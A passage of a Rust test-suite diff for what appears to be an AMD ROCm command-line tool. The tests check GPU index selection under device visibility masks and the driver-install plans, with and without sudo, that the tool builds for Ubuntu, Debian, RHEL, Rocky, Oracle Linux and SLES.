+        assert_eq!(
+            select_auto_gpu_index(Some(4), Some(&[2, 3]), &[2], None),
+            vec![3]
+        );
+    }
+
+    #[test]
+    fn auto_selection_all_visible_busy_falls_back_to_lowest_visible_not_zero() {
+        // Every visible GPU is pinned; the fallback must be the lowest *visible*
+        // ordinal (2), not a hardcoded 0 that the mask has hidden.
+        assert_eq!(
+            select_auto_gpu_index(Some(4), Some(&[2, 3]), &[2, 3], None),
+            vec![2]
+        );
+    }
+
+    #[test]
+    fn auto_selection_returns_none_when_every_device_masked_out() {
+        // An empty visible set means no candidate survives the mask: return no
+        // selection rather than assuming device 0.
+        assert_eq!(
+            select_auto_gpu_index(Some(4), Some(&[]), &[], None),
+            Vec::<u32>::new()
+        );
     }
 
     #[test]
     fn validate_pinned_gpu_index_rejects_out_of_range() {
         // Index equal to or beyond the detected count is rejected.
-        let error = validate_pinned_gpu_index(4, Some(4)).expect_err("index 4 is out of range");
+        let error = validate_pinned_gpu_index(4, Some(4), None, false)
+            .expect_err("index 4 is out of range");
         assert!(error.to_string().contains("out of range"));
-        assert!(validate_pinned_gpu_index(9, Some(2)).is_err());
+        assert!(validate_pinned_gpu_index(9, Some(2), None, false).is_err());
     }
 
     #[test]
     fn validate_pinned_gpu_index_accepts_in_range_or_unknown_count() {
         // In-range index pins exactly that ordinal.
-        assert_eq!(validate_pinned_gpu_index(0, Some(1)).unwrap(), vec![0]);
-        assert_eq!(validate_pinned_gpu_index(3, Some(4)).unwrap(), vec![3]);
+        assert_eq!(
+            validate_pinned_gpu_index(0, Some(1), None, false).unwrap(),
+            vec![0]
+        );
+        assert_eq!(
+            validate_pinned_gpu_index(3, Some(4), None, false).unwrap(),
+            vec![3]
+        );
         // Unknown count (amd-smi unavailable) is allowed through unvalidated.
-        assert_eq!(validate_pinned_gpu_index(7, None).unwrap(), vec![7]);
+        assert_eq!(
+            validate_pinned_gpu_index(7, None, None, false).unwrap(),
+            vec![7]
+        );
+    }
+
+    #[test]
+    fn validate_pinned_gpu_index_rejects_masked_out_device() {
+        // The visible set is authoritative: an index outside it is rejected early
+        // with the usable set, rather than deferring to a late engine error. A
+        // mask is set here, so the message names the visibility variables.
+        let error = validate_pinned_gpu_index(0, Some(4), Some(&[2, 3]), true)
+            .expect_err("masked-out device must be rejected");
+        let message = error.to_string();
+        assert!(message.contains("not available under the active visibility mask"));
+        assert!(message.contains("[2, 3]"));
+        // A visible index still pins exactly that ordinal.
+        assert_eq!(
+            validate_pinned_gpu_index(2, Some(4), Some(&[2, 3]), true).unwrap(),
+            vec![2]
+        );
+        // An empty visible set is authoritative "no GPU usable" (every device
+        // masked out), not "could not enumerate" — the latter is `None`, per the
+        // `usable_amd_gpu_indices` contract. So it rejects rather than falling
+        // through to the count check; the detected count must not override it.
+        let masked_out = validate_pinned_gpu_index(1, Some(4), Some(&[]), true)
+            .expect_err("an all-masked host must reject an explicit --gpu index");
+        assert!(
+            masked_out
+                .to_string()
+                .contains("no usable AMD GPU is available")
+        );
+    }
+
+    #[test]
+    fn validate_pinned_gpu_index_absent_index_without_mask_reads_as_not_present() {
+        // No visibility mask is set, yet amd-smi counts more devices than the
+        // KFD/DRM probe finds, so the authoritative visible set (0..present) is
+        // shorter than `detected`. An index in that gap is genuinely absent from
+        // the host — the rejection must say so and must NOT blame HIP/ROCR
+        // variables the user never set (that message sends them debugging a mask
+        // that does not exist).
+        let error = validate_pinned_gpu_index(2, Some(4), Some(&[0, 1]), false)
+            .expect_err("an index past the visible set must be refused");
+        let message = error.to_string();
+        assert!(
+            message.contains("not present on this host"),
+            "unmasked rejection should read as not-present, got: {message}"
+        );
+        assert!(
+            !message.contains("visibility mask"),
+            "must not blame a mask when none is set, got: {message}"
+        );
+        assert!(message.contains("[0, 1]"));
+
+        // The all-empty visible set with no mask is a not-present message too,
+        // never a spurious mask advisory.
+        let empty = validate_pinned_gpu_index(0, Some(2), Some(&[]), false)
+            .expect_err("no present GPU must refuse an explicit --gpu index");
+        assert!(empty.to_string().contains("present on this host"));
+        assert!(!empty.to_string().contains("visibility mask"));
+    }
+
+    #[test]
+    fn validate_pinned_gpu_index_prefers_visible_set_over_detected_count() {
+        // detected and visible come from different probes. When both are known the
+        // visible set wins, so an index inside the detected count but outside the
+        // HIP-visible set is still rejected (and vice versa), instead of the two
+        // being compared as one ordinal space.
+        assert_eq!(
+            validate_pinned_gpu_index(1, Some(4), Some(&[0, 1]), true).unwrap(),
+            vec![1]
+        );
+        assert!(
+            validate_pinned_gpu_index(2, Some(4), Some(&[0, 1]), true).is_err(),
+            "index within the detected count but outside the visible set must reject"
+        );
     }
 
     #[test]
@@ -23144,14 +29964,198 @@ install therock";
         assert!(vram_capacity_is_meaningful(None, 1));
     }
 
+    /// Every distro whose plan actually emits privileged commands, so the
+    /// escalation tests below sweep all of them rather than whichever one was
+    /// remembered. Adding a distro to the planner without adding it here would
+    /// leave its commands unswept.
+    fn dkms_planning_os_releases() -> Vec<(&'static str, &'static str)> {
+        vec![
+            (
+                "ubuntu",
+                "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n",
+            ),
+            ("debian", "ID=debian\nVERSION_ID=\"12\"\n"),
+            ("rhel", "ID=rhel\nVERSION_ID=\"9.7\"\n"),
+            ("rhel-8", "ID=rhel\nVERSION_ID=\"8.10\"\n"),
+            ("oracle", "ID=ol\nVERSION_ID=\"9.7\"\n"),
+            ("rocky", "ID=rocky\nVERSION_ID=\"9.4\"\n"),
+            ("sles", "ID=sles\nVERSION_ID=\"15.7\"\n"),
+            (
+                "almalinux-via-id-like",
+                "ID=almalinux\nVERSION_ID=\"9.4\"\nID_LIKE=\"rhel centos fedora\"\n",
+            ),
+        ]
+    }
+
+    fn plan_commands(os_release: &str, escalation: PrivilegeEscalation) -> Vec<String> {
+        build_driver_install_plan(&test_examine("linux", false), os_release, true, escalation)
+            .commands
+            .into_iter()
+            .map(|command| command.command)
+            .collect()
+    }
+
+    #[test]
+    fn driver_plan_as_root_never_emits_sudo() {
+        // The defect: every command was prefixed `sudo` unconditionally, so on a
+        // root host without the binary the first one died with `sudo: not found`
+        // before any driver work. This asserts the ABSENCE of `sudo` across every
+        // distro rather than checking known commands one by one — a templating
+        // site missed on some distro fails here instead of shipping.
+        for (label, os_release) in dkms_planning_os_releases() {
+            let commands = plan_commands(os_release, PrivilegeEscalation::AlreadyRoot);
+            assert!(
+                !commands.is_empty(),
+                "{label}: expected a dkms plan to emit commands"
+            );
+            for command in &commands {
+                assert!(
+                    !command.contains("sudo"),
+                    "{label}: a plan built as root must not invoke sudo, got `{command}`"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn driver_plan_off_root_still_escalates_every_privileged_command() {
+        // The other half of the contract: dropping `sudo` when root must not drop
+        // it when a normal user runs the same plan. Verify-phase commands are
+        // read-only probes and are deliberately unprivileged, so only the
+        // mutating phases are required to escalate.
+        for (label, os_release) in dkms_planning_os_releases() {
+            let plan = build_driver_install_plan(
+                &test_examine("linux", false),
+                os_release,
+                true,
+                PrivilegeEscalation::Sudo,
+            );
+            let privileged: Vec<&DriverPlanCommand> = plan
+                .commands
+                .iter()
+                .filter(|command| {
+                    matches!(
+                        command.phase,
+                        DriverCommandPhase::Prepare | DriverCommandPhase::Execute
+                    )
+                })
+                .collect();
+            assert!(!privileged.is_empty(), "{label}: expected privileged steps");
+            for command in privileged {
+                assert!(
+                    command.command.contains("sudo "),
+                    "{label}: a plan built off root must escalate, got `{}`",
+                    command.command
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn driver_plan_as_root_keeps_shell_pipelines_intact() {
+        // `sudo` also appears mid-pipeline (`| sudo tee`, `| sudo gpg`), which a
+        // naive "strip a leading prefix" fix would miss. The pipeline must survive
+        // with the escalation removed from the right-hand side only.
+        let ubuntu = "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n";
+        let commands = plan_commands(ubuntu, PrivilegeEscalation::AlreadyRoot);
+        assert!(
+            commands
+                .iter()
+                .any(|command| command.contains("| tee /etc/apt/sources.list.d/amdgpu.list")),
+            "the apt-source pipeline must still tee, unprefixed: {commands:?}"
+        );
+        assert!(
+            commands
+                .iter()
+                .any(|command| command.contains("| gpg --dearmor -o /etc/apt/keyrings/rocm.gpg")),
+            "the keyring pipeline must still call gpg, unprefixed: {commands:?}"
+        );
+    }
+
+    #[test]
+    fn driver_plan_records_the_commands_it_will_actually_run() {
+        // `execution_commands()` is what lands in state.json. It must agree with
+        // the escalation the plan was built under, or the recorded history
+        // describes commands that never ran.
+        let ubuntu = "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n";
+        let as_root = build_driver_install_plan(
+            &test_examine("linux", false),
+            ubuntu,
+            true,
+            PrivilegeEscalation::AlreadyRoot,
+        );
+        assert!(
+            as_root
+                .execution_commands()
+                .iter()
+                .all(|command| !command.contains("sudo")),
+            "state.json must not record sudo commands for a root run"
+        );
+        let off_root = build_driver_install_plan(
+            &test_examine("linux", false),
+            ubuntu,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
+        assert!(
+            off_root
+                .execution_commands()
+                .iter()
+                .all(|command| command.contains("sudo ")),
+            "state.json must record the sudo commands a non-root run performs"
+        );
+    }
+
+    #[test]
+    fn driver_plan_as_root_drops_the_sudo_binary_precondition() {
+        // The preflight claimed `sudo` must be installed even when the plan no
+        // longer uses it — the same contradiction the bug report called out
+        // between the stated preconditions and what execution actually did.
+        for (label, os_release) in dkms_planning_os_releases() {
+            let as_root = build_driver_install_plan(
+                &test_examine("linux", false),
+                os_release,
+                true,
+                PrivilegeEscalation::AlreadyRoot,
+            );
+            assert!(
+                !as_root
+                    .preflight_checks
+                    .iter()
+                    .any(|check| check.contains("`sudo` command is available")),
+                "{label}: a root plan must not require a sudo binary: {:?}",
+                as_root.preflight_checks
+            );
+            let off_root = build_driver_install_plan(
+                &test_examine("linux", false),
+                os_release,
+                true,
+                PrivilegeEscalation::Sudo,
+            );
+            assert!(
+                off_root
+                    .preflight_checks
+                    .iter()
+                    .any(|check| check.contains("`sudo` command is available")),
+                "{label}: a non-root plan still depends on a sudo binary"
+            );
+        }
+    }
+
     #[test]
     fn driver_plan_ubuntu_2404_uses_official_dkms_commands() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         let os_release = r#"
 ID=ubuntu
 VERSION_ID="24.04"
 VERSION_CODENAME=noble
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let commands = plan
             .commands
             .iter()
@@ -23196,6 +30200,195 @@ VERSION_CODENAME=noble
         assert!(rendered.contains("post_reboot_check_commands:"));
         assert!(rendered.contains("dkms status amdgpu"));
         assert!(rendered.contains("rerun with --yes"));
+    }
+
+    #[test]
+    fn driver_plan_executor_runs_verify_after_execute() -> Result<()> {
+        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        plan.commands = vec![
+            driver_command(DriverCommandPhase::Prepare, "prepare"),
+            driver_command(DriverCommandPhase::Execute, "execute"),
+            driver_command(DriverCommandPhase::Verify, "verify"),
+        ];
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", true).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        let mut observed = Vec::new();
+
+        execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |command| {
+                observed.push(command.to_owned());
+                Ok(())
+            },
+            |_| Ok(()),
+            || Ok(test_examine("linux", true).driver),
+        )?;
+
+        assert_eq!(observed, ["prepare", "execute", "verify"]);
+        assert!(state.executed_at_unix_ms.is_some());
+        Ok(())
+    }
+
+    #[test]
+    fn driver_plan_executor_defers_verify_when_reboot_is_required() -> Result<()> {
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n",
+            true,
+            PrivilegeEscalation::Sudo,
+        );
+        assert!(plan.reboot_required);
+        let expected = plan.execution_commands();
+        let verify_commands = plan
+            .commands
+            .iter()
+            .filter(|command| command.phase == DriverCommandPhase::Verify)
+            .map(|command| command.command.clone())
+            .collect::<Vec<_>>();
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", false).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        let mut observed = Vec::new();
+
+        execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |command| {
+                observed.push(command.to_owned());
+                Ok(())
+            },
+            |_| Ok(()),
+            || Ok(test_examine("linux", false).driver),
+        )?;
+
+        assert_eq!(observed, expected);
+        assert!(
+            verify_commands
+                .iter()
+                .all(|command| !observed.contains(command)),
+            "reboot-gated Verify commands must be deferred: {verify_commands:?}"
+        );
+        assert!(state.executed_at_unix_ms.is_some());
+        assert!(state.reboot_required);
+        Ok(())
+    }
+
+    #[test]
+    fn failed_driver_verify_does_not_mark_execution_completed() -> Result<()> {
+        let (root, paths) = test_paths("driver-verify-failure-state");
+        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        plan.commands = vec![
+            driver_command(DriverCommandPhase::Prepare, "prepare"),
+            driver_command(DriverCommandPhase::Execute, "execute"),
+            driver_command(DriverCommandPhase::Verify, "verify"),
+        ];
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", true).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        write_driver_install_state(&paths, &state)?;
+        let mut observed = Vec::new();
+        let mut gathered = false;
+
+        let error = execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |command| {
+                observed.push(command.to_owned());
+                if command == "verify" {
+                    bail!("verification rejected the install");
+                }
+                Ok(())
+            },
+            |state| write_driver_install_state(&paths, state),
+            || {
+                gathered = true;
+                Ok(test_examine("linux", true).driver)
+            },
+        )
+        .expect_err("failed verification must fail the install");
+        let saved = read_driver_install_state(&paths)?.expect("state should remain readable");
+
+        assert_eq!(observed, ["prepare", "execute", "verify"]);
+        assert!(error.to_string().contains("driver command failed: verify"));
+        assert!(
+            !gathered,
+            "post-install state must not be gathered after failure"
+        );
+        assert_eq!(state.executed_at_unix_ms, None);
+        assert!(state.post_driver.is_none());
+        assert_eq!(saved.executed_at_unix_ms, None);
+        assert!(saved.post_driver.is_none());
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn failed_post_driver_gather_keeps_executed_state_persisted() -> Result<()> {
+        let (root, paths) = test_paths("driver-gather-failure-state");
+        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        plan.commands = vec![
+            driver_command(DriverCommandPhase::Prepare, "prepare"),
+            driver_command(DriverCommandPhase::Execute, "execute"),
+            driver_command(DriverCommandPhase::Verify, "verify"),
+        ];
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", true).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        write_driver_install_state(&paths, &state)?;
+
+        let error = execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |_| Ok(()),
+            |state| write_driver_install_state(&paths, state),
+            || bail!("post-driver gather failed"),
+        )
+        .expect_err("a post-driver gather failure must still fail the install");
+        let saved = read_driver_install_state(&paths)?.expect("state should remain readable");
+
+        assert!(error.to_string().contains("post-driver gather failed"));
+        assert!(saved.executed_at_unix_ms.is_some());
+        assert!(saved.post_driver.is_none());
+        let _ = fs::remove_dir_all(root);
+        Ok(())
     }
 
     #[test]
@@ -23286,6 +30479,48 @@ VERSION_CODENAME=noble
     }
 
     #[test]
+    fn driver_reconcile_preserves_explicit_reboot_policy() -> Result<()> {
+        for reboot_required in [false, true] {
+            let (root, paths) = test_paths(if reboot_required {
+                "driver-reconcile-reboot-true"
+            } else {
+                "driver-reconcile-reboot-false"
+            });
+            let driver = rocm_core::DriverSummary {
+                policy: "driver-policy".to_owned(),
+                status: "available".to_owned(),
+                detail: None,
+            };
+            let mut state = DriverInstallState {
+                approved_at_unix_ms: 1,
+                executed_at_unix_ms: Some(2),
+                pre_driver: driver.clone(),
+                post_driver: None,
+                boot_id_at_execution: Some("same-boot".to_owned()),
+                reboot_required,
+                reboot_observed: false,
+                commands: vec!["execute".to_owned()],
+                reconciled_at_unix_ms: None,
+                reconciliation: None,
+            };
+
+            reconcile_driver_install_state(
+                &paths,
+                &mut state,
+                driver,
+                Some("same-boot".to_owned()),
+                Vec::new(),
+            )?;
+            let saved = read_driver_install_state(&paths)?.expect("state should be saved");
+
+            assert_eq!(state.reboot_required, reboot_required);
+            assert_eq!(saved.reboot_required, reboot_required);
+            let _ = fs::remove_dir_all(root);
+        }
+        Ok(())
+    }
+
+    #[test]
     fn driver_passive_check_summary_counts_non_present_as_missing() {
         let summary = summarize_driver_passive_checks(&[
             DriverPassiveCheck {
@@ -23312,12 +30547,18 @@ VERSION_CODENAME=noble
 
     #[test]
     fn driver_plan_default_linux_preflight_has_no_execution_commands() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         let os_release = r#"
 ID=ubuntu
 VERSION_ID="24.04"
 VERSION_CODENAME=noble
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, false);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            false,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
         assert!(plan.supported);
@@ -23330,13 +30571,100 @@ VERSION_CODENAME=noble
     }
 
     #[test]
+    fn resolve_shell_default_template_uses_default_when_env_unset() {
+        let _env = ScopedTestEnv::new();
+        // A made-up variable name that nothing else sets, cleared under the lock,
+        // isolates the default path.
+        assert_eq!(
+            resolve_shell_default_template("${ROCM_CLI_TEST_UNSET_REPO_VERSION:-7.2.4}"),
+            "7.2.4"
+        );
+    }
+
+    #[test]
+    fn resolve_shell_default_template_prefers_env_value_when_set() {
+        let mut env = ScopedTestEnv::new();
+        let var = "ROCM_CLI_TEST_REPO_VERSION_OVERRIDE";
+        env.set(var, "9.9.9");
+        assert_eq!(
+            resolve_shell_default_template(&format!("${{{var}:-7.2.4}}")),
+            "9.9.9"
+        );
+    }
+
+    #[test]
+    fn resolve_shell_default_template_treats_empty_env_as_unset() {
+        let mut env = ScopedTestEnv::new();
+        let var = "ROCM_CLI_TEST_REPO_VERSION_EMPTY";
+        env.set(var, "");
+        assert_eq!(
+            resolve_shell_default_template(&format!("${{{var}:-7.2.4}}")),
+            "7.2.4"
+        );
+    }
+
+    #[test]
+    fn resolve_shell_default_template_passes_through_non_template() {
+        assert_eq!(resolve_shell_default_template("7.2.4"), "7.2.4");
+    }
+
+    #[test]
+    fn resolve_shell_default_template_leaves_bare_var_untouched() {
+        let _env = ScopedTestEnv::new();
+        // No `:-default`, so there is nothing to resolve to; the input must pass
+        // through unchanged rather than being partially rewritten.
+        assert_eq!(
+            resolve_shell_default_template("${ROCM_CLI_TEST_UNSET_REPO_VERSION}"),
+            "${ROCM_CLI_TEST_UNSET_REPO_VERSION}"
+        );
+    }
+
+    #[test]
+    fn resolve_shell_default_template_leaves_nested_default_untouched() {
+        let _env = ScopedTestEnv::new();
+        // A nested default is beyond the flat matcher; returning the literal
+        // input keeps a `${B:-x}` fragment from leaking as a "resolved" value.
+        assert_eq!(
+            resolve_shell_default_template("${ROCM_CLI_TEST_UNSET_A:-${ROCM_CLI_TEST_UNSET_B:-x}}"),
+            "${ROCM_CLI_TEST_UNSET_A:-${ROCM_CLI_TEST_UNSET_B:-x}}"
+        );
+    }
+
+    #[test]
+    fn driver_plan_dry_run_repo_version_line_is_resolved() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
+        // Regression for the dry-run output leaking the raw shell placeholder on
+        // the `repo_version:` line instead of the effective version.
+        let os_release = r#"
+ID=rhel
+VERSION_ID="9.7"
+"#;
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
+        let rendered = render_driver_install_plan(&plan, false, true);
+
+        assert!(rendered.contains("repo_version: 7.2.4"));
+        assert!(!rendered.contains("repo_version: ${ROCM_CLI_AMDGPU_VERSION:-7.2.4}"));
+    }
+
+    #[test]
     fn driver_plan_debian_12_omits_linux_modules_extra() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         let os_release = r#"
 ID=debian
 VERSION_ID="12"
 VERSION_CODENAME=bookworm
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, true);
 
         assert!(plan.supported);
@@ -23349,11 +30677,17 @@ VERSION_CODENAME=bookworm
 
     #[test]
     fn driver_plan_rhel_97_uses_documented_dnf_commands() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         let os_release = r#"
 ID=rhel
 VERSION_ID="9.7"
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
         assert!(plan.supported);
@@ -23363,42 +30697,48 @@ VERSION_ID="9.7"
         assert!(rendered.contains("kernel-headers-$(uname -r)"));
         assert!(rendered.contains("kernel-devel-$(uname -r)"));
         assert!(rendered.contains("kernel-devel-matched-$(uname -r)"));
-        assert!(rendered.contains(
-            "repo.radeon.com/amdgpu-install/${ROCM_CLI_AMDGPU_VERSION:-7.2.4}/rhel/9.7/"
-        ));
-        assert!(rendered.contains("amdgpu-install-${ROCM_CLI_AMDGPU_VERSION:-7.2.4}.${ROCM_CLI_AMDGPU_PACKAGE_RELEASE:-70204}-1.el9.noarch.rpm"));
+        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/rhel/9.7/"));
+        assert!(rendered.contains("amdgpu-install-7.2.4.70204-1.el9.noarch.rpm"));
         assert!(rendered.contains("Execute: sudo dnf install -y amdgpu-dkms"));
         assert!(rendered.contains("approval: required"));
     }
 
     #[test]
     fn driver_plan_oracle_linux_101_uses_el_10_uek_flow() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         let os_release = r#"
 ID=ol
 VERSION_ID="10.1"
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, true);
 
         assert!(plan.supported);
         assert!(rendered.contains("approval: not required"));
         assert!(rendered.contains("kernel-uek-devel-$(uname -r)"));
-        assert!(
-            rendered.contains(
-                "repo.radeon.com/amdgpu-install/${ROCM_CLI_AMDGPU_VERSION:-7.2.4}/el/10/"
-            )
-        );
-        assert!(rendered.contains("amdgpu-install-${ROCM_CLI_AMDGPU_VERSION:-7.2.4}.${ROCM_CLI_AMDGPU_PACKAGE_RELEASE:-70204}-1.el10.noarch.rpm"));
+        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/el/10/"));
+        assert!(rendered.contains("amdgpu-install-7.2.4.70204-1.el10.noarch.rpm"));
         assert!(rendered.contains("dry run only"));
     }
 
     #[test]
     fn driver_plan_rocky_97_uses_el_dnf_flow() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         let os_release = r#"
 ID=rocky
 VERSION_ID="9.7"
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
         assert!(plan.supported);
@@ -23406,41 +30746,45 @@ VERSION_ID="9.7"
             rendered
                 .contains("sudo dnf install -y kernel-headers kernel-devel kernel-devel-matched")
         );
-        assert!(
-            rendered.contains(
-                "repo.radeon.com/amdgpu-install/${ROCM_CLI_AMDGPU_VERSION:-7.2.4}/el/9.7/"
-            )
-        );
+        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/el/9.7/"));
         assert!(rendered.contains("Execute: sudo dnf install -y amdgpu-dkms"));
     }
 
     #[test]
     fn driver_plan_rocky_94_uses_el_dnf_flow() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         // Rocky 9.x point releases must resolve like RHEL 9.x, not just 9.7.
         let os_release = r#"
 ID=rocky
 VERSION_ID="9.4"
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
         assert!(plan.supported);
         assert!(plan.mutating);
-        assert!(
-            rendered.contains(
-                "repo.radeon.com/amdgpu-install/${ROCM_CLI_AMDGPU_VERSION:-7.2.4}/el/9.4/"
-            )
-        );
-        assert!(rendered.contains("amdgpu-install-${ROCM_CLI_AMDGPU_VERSION:-7.2.4}.${ROCM_CLI_AMDGPU_PACKAGE_RELEASE:-70204}-1.el9.noarch.rpm"));
+        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/el/9.4/"));
+        assert!(rendered.contains("amdgpu-install-7.2.4.70204-1.el9.noarch.rpm"));
         assert!(rendered.contains("Execute: sudo dnf install -y amdgpu-dkms"));
     }
 
     #[test]
     fn driver_plan_rocky_8_and_10_remain_unsupported() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         // AMD documents Rocky Linux 9 only; keep the driver matrix scoped to 9.x.
         for version in ["8.10", "10.0"] {
             let os_release = format!("\nID=rocky\nVERSION_ID=\"{version}\"\n");
-            let plan = build_driver_install_plan(&test_examine("linux", false), &os_release, true);
+            let plan = build_driver_install_plan(
+                &test_examine("linux", false),
+                &os_release,
+                true,
+                PrivilegeEscalation::Sudo,
+            );
             assert!(!plan.supported, "rocky {version} should be unsupported");
             assert!(!plan.mutating, "rocky {version} must not mutate");
             assert!(
@@ -23452,6 +30796,7 @@ VERSION_ID="9.4"
 
     #[test]
     fn driver_plan_debian_uses_intended_ubuntu_suite() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         // AMD's documented Debian install deliberately serves Debian from the
         // Ubuntu-suite graphics tree (Debian 12 -> jammy). Lock that in and
         // ensure the plan explains the mapping is intentional.
@@ -23460,14 +30805,17 @@ ID=debian
 VERSION_ID="12"
 VERSION_CODENAME=bookworm
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, true);
 
         assert!(plan.supported);
         assert_eq!(plan.codename, "jammy");
-        assert!(rendered.contains(
-            "https://repo.radeon.com/graphics/${ROCM_CLI_AMDGPU_VERSION:-7.2.4}/ubuntu jammy main"
-        ));
+        assert!(rendered.contains("https://repo.radeon.com/graphics/7.2.4/ubuntu jammy main"));
         assert!(
             plan.reason
                 .contains("intentionally uses AMD's Ubuntu-suite repository")
@@ -23476,11 +30824,17 @@ VERSION_CODENAME=bookworm
 
     #[test]
     fn driver_plan_sles_157_uses_documented_zypper_commands() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         let os_release = r#"
 ID=sles
 VERSION_ID="15.7"
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            os_release,
+            true,
+            PrivilegeEscalation::Sudo,
+        );
         let rendered = render_driver_install_plan(&plan, false, false);
 
         assert!(plan.supported);
@@ -23488,9 +30842,7 @@ VERSION_ID="15.7"
         assert!(rendered.contains("SUSEConnect"));
         assert!(rendered.contains("sle-module-desktop-applications/15.7/x86_64"));
         assert!(rendered.contains("sudo zypper install -y kernel-default-devel"));
-        assert!(rendered.contains(
-            "repo.radeon.com/amdgpu-install/${ROCM_CLI_AMDGPU_VERSION:-7.2.4}/sle/15.7/"
-        ));
+        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/sle/15.7/"));
         assert!(rendered.contains("sudo zypper --no-gpg-checks install -y"));
         assert!(rendered.contains("Execute: sudo zypper install -y amdgpu-dkms"));
         assert!(rendered.contains("approval: required"));
@@ -23498,11 +30850,17 @@ VERSION_ID="15.7"
 
     #[test]
     fn driver_plan_unsupported_linux_is_non_mutating() {
+        let _env = ScopedTestEnv::with_amd_overrides_cleared();
         let os_release = r#"
 ID=fedora
 VERSION_ID="41"
 "#;
-        let plan = build_driver_install_plan(&test_examine("linux", false), os_release, true);
